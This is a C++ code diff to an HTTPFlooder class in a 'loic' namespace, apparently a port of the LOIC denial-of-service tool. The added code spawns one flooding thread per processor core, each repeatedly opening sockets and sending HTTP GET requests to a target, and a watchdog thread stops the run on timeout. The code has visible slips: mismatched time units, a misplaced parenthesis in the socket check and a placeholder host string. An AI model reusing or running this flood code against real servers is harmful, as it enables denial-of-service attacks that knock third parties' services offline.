@@ -5,29 +5,9 @@
  *      Author: ivan
  */
 
-#include <iostream>
+
 #include "HTTPFlooder.h"
-#include <sys/types.h>
-#include <netinet/in.h>
-#include <sys/socket.h>
-#include <netdb.h>
-#include <unistd.h>
-#include <errno.h>
-#include <arpa/inet.h>
-#include <sstream>
 namespace loic {
-
-	void HTTPFlooder::Start()
-	{
-
-	}
-
-
-	void HTTPFlooder::Stop()
-	{
-
-
-	}
 
 	void HTTPFlooder::work()
 	{
@@ -37,6 +17,7 @@ namespace loic {
 			{
 				this->state = readyState;
 				//tick
+				lastAction = time(NULL)/3600;
 
 				int socketHandle;
 				if((socketHandle = socket(AF_INET,SOCK_STREAM,IPPROTO_IP)<0)){
@@ -48,12 +29,12 @@ namespace loic {
 				this->state = connectingState;
 
 
+
 				/* socket work */
 
 				struct sockaddr_in remoteSocketInfo;
 
 				std::string remoteHost = "from the ip address";
-				int portNumber = 8080;
 
 				bzero(&remoteSocketInfo, sizeof(sockaddr_in)); //clear memory
 
@@ -79,7 +60,7 @@ namespace loic {
 				}
 
 				remoteSocketInfo.sin_family = AF_INET;
-				remoteSocketInfo.sin_port = htons((u_short)portNumber);
+				remoteSocketInfo.sin_port = htons((u_short)port);
 				if((connect(socketHandle, (struct sockaddr *)&remoteSocketInfo, sizeof(sockaddr_in)))<0)
 				{
 					close(socketHandle);
@@ -95,6 +76,7 @@ namespace loic {
 				stream<<"GET "<<this->subsite<<" HTTP/1.0\n\n\n";
 				strcpy(buf,stream.str().c_str());
 				send(socketHandle,buf,strlen(buf)+1,0);
+
 
 				this->state = downloadingState;
 				requested++;
@@ -119,7 +101,6 @@ namespace loic {
 				this->state = completedState;
 				downloaded++;
 
-				//timpoll.stop();
 
 				if(delay>0)
 				{
@@ -131,6 +112,41 @@ namespace loic {
 		{
 			std::cerr<<exe.what()<<std::endl;
 		}
+		flooding = false;
+	}
+
+	void HTTPFlooder::checkTimeOut()
+	{
+		while(flooding)
+		{
+			time_t now = time(NULL)/3600;	//time since epoch
+
+			if(difftime(now,lastAction)>timeout)
+			{
+				flooding = false;
+				this->failed++;
+				this->state = failedState;
+			}
+			boost::this_thread::sleep(boost::posix_time::milliseconds(100));
+		}
+	}
+	void HTTPFlooder::Start()
+	{
+		flooding = true;
+		lastAction = time(NULL);
+
+		//can use bind as well
+		boost::thread t(&loic::HTTPFlooder::checkTimeOut,this);
+
+		for(unsigned int i = 0; i<boost::thread::hardware_concurrency();i++)
+		{
+			boost::thread thread(&loic::HTTPFlooder::work,this);
+		}
+	}
+
+
+	void HTTPFlooder::Stop()
+	{
 		flooding = false;
 	}
 
